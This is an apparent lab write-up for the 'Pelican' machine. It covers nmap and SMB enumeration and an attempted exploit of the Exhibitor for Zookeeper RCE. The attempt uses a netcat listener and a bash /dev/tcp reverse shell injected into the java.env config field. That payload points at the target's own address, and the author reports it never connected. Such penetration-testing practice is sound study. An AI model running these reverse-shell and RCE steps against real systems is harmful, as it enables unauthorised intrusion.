lab Pelican 

target 192.168.55.98

recon 

```bash
sudo nmap -sC -sV pelican -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDssyyACw3AHaTatHhBU1VyBRbKOirrDG8M9IjpJPTf/v8mdIqiXk1HsBdoFZcsmWJVV4OXC7GMcHa+s0tZceTmgGf5TpiCB2yXUYPZre183LjJWM6KQMZVI0LHz9Yd3ji2bdD5jjtVxwnjrdx8GlU1THMGbzZivfSsPF18arMIq3ukYBS09Ov1SIKR4DJ7pjtBRutRBZKI/8/H+uB2u47AQRwbWuVaOmtZyDrfvgL/IqAFRQrbeP1VNQAErzHl8wNuk1vR+yROv0j7smTqoqqc8aB751O63gtBdCvKzpigwFDLyxYuzu8dW1Hh6ZQzaQZgWkw6SZeExAijK7yXSU61
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUPmkVV/Q+iD07j1sFmdFWp7yppofTTgfzAhvMkyGPulIdMDbzFgW/pRAq3R3zZV7aEcWAMfFHgdXfj3W4FUuc=
|   256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPO1eLYoJ0AhVJ5NIDfaSrfUis34Bw5bKMMdFWzHPx0
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         syn-ack CUPS 2.2
| http-methods:
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   syn-ack Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDssyyACw3AHaTatHhBU1VyBRbKOirrDG8M9IjpJPTf/v8mdIqiXk1HsBdoFZcsmWJVV4OXC7GMcHa+s0tZceTmgGf5TpiCB2yXUYPZre183LjJWM6KQMZVI0LHz9Yd3ji2bdD5jjtVxwnjrdx8GlU1THMGbzZivfSsPF18arMIq3ukYBS09Ov1SIKR4DJ7pjtBRutRBZKI/8/H+uB2u47AQRwbWuVaOmtZyDrfvgL/IqAFRQrbeP1VNQAErzHl8wNuk1vR+yROv0j7smTqoqqc8aB751O63gtBdCvKzpigwFDLyxYuzu8dW1Hh6ZQzaQZgWkw6SZeExAijK7yXSU61
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUPmkVV/Q+iD07j1sFmdFWp7yppofTTgfzAhvMkyGPulIdMDbzFgW/pRAq3R3zZV7aEcWAMfFHgdXfj3W4FUuc=
|   256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPO1eLYoJ0AhVJ5NIDfaSrfUis34Bw5bKMMdFWzHPx0
8080/tcp  open  http        syn-ack Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        syn-ack nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.203.98:8080/exhibitor/v1/ui/index.html
46295/tcp open  java-rmi    syn-ack Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 42661/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 56802/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 5883/udp): CLEAN (Failed to receive data)
|   Check 4 (port 49480/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2024-09-14T05:50:39-04:00
|_clock-skew: mean: 1h20m06s, deviation: 2h18m35s, median: 5s
| smb2-time:
|   date: 2024-09-14T09:50:37
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```


<img width="885" height="42" alt="image" src="https://github.com/user-attachments/assets/ee04f934-21a5-4981-b98d-ee968749741f" />

SMB is open 139/445, we can check if there are any shares we have anonymous access to with smbmap.

```bash
smbmap -H 192.168.55.98
```
<img width="1054" height="541" alt="image" src="https://github.com/user-attachments/assets/c0e688f5-4a7e-4da5-9c9b-8642727f7098" />

Since we have no access I decided to skip this port.


CUPS

Since I’ve never heard of this before I decided to look it up on this site and found the following info on it:


<img width="770" height="830" alt="image" src="https://github.com/user-attachments/assets/0a9f7f10-4dee-442f-90b4-8b6e0636c83b" />

This might be useful? But for now I decided to enumerate further.

In our nmap scan we have a http port 8081 that mentions a redirect to http://pelican:8080/exhibitor/v1/ui/index.html. If we follow that URL we land on this page.

<img width="915" height="23" alt="image" src="https://github.com/user-attachments/assets/01005d7a-a1be-4f39-af6a-6fc9fa5ba360" />

<img width="1237" height="438" alt="image" src="https://github.com/user-attachments/assets/27e87124-cada-4e2c-afa3-5584c441d327" />

Doing a quick google search for Exhibitor for Zookeeper just to see what it is, we are prompted with a RCE vulnerability. That is good to see.

<img width="1625" height="598" alt="image" src="https://github.com/user-attachments/assets/ae5622de-6582-42e1-9782-f197819c817f" />

Interesting, I decided to check out the CVE on exploit-db:  https://www.exploit-db.com/exploits/48654

<img width="1083" height="342" alt="image" src="https://github.com/user-attachments/assets/bcfd6595-73b1-4015-8009-40635b76f81a" />
Sounds promising so I decided to start off with this port.

8081/TCP - Exhibitor

It does look promising, so I followed the CVE steps:

<img width="1088" height="629" alt="image" src="https://github.com/user-attachments/assets/1678b95a-2422-4d21-b6db-880d483b4786" />

I started off by going to the Config tab -> Editing - ON:
<img width="716" height="171" alt="image" src="https://github.com/user-attachments/assets/2fcf9e4b-a4e0-4b29-875d-4b88222e83d7" />

I then booted up a listener:

```bash
nc -lvnp 4444
```
<img width="415" height="92" alt="image" src="https://github.com/user-attachments/assets/004c0f1b-eead-462b-a8fd-4e0ec41bb57a" />

And proceeded to enter the reverse shell payload in the java.env field:

```bash
bash -i >& /dev/tcp/192.168.55.98/4444 0>&1 &
```

<img width="622" height="30" alt="image" src="https://github.com/user-attachments/assets/3de67687-adea-4028-a6f7-1724155ae361" />

<img width="717" height="56" alt="image" src="https://github.com/user-attachments/assets/f46b278d-9579-4aeb-96e1-f35750054c8b" />

<img width="539" height="46" alt="image" src="https://github.com/user-attachments/assets/76693073-aa40-4633-bf3e-f6ce033c7945" />

I then clicked on Commit in the top bar and All at Once... -> OK

<img width="510" height="255" alt="image" src="https://github.com/user-attachments/assets/a987039b-64d3-4018-ac74-c80ef8d79eba" />

i had waited few minutes but listner doesnt connected.. there might be issue on lab will check it later

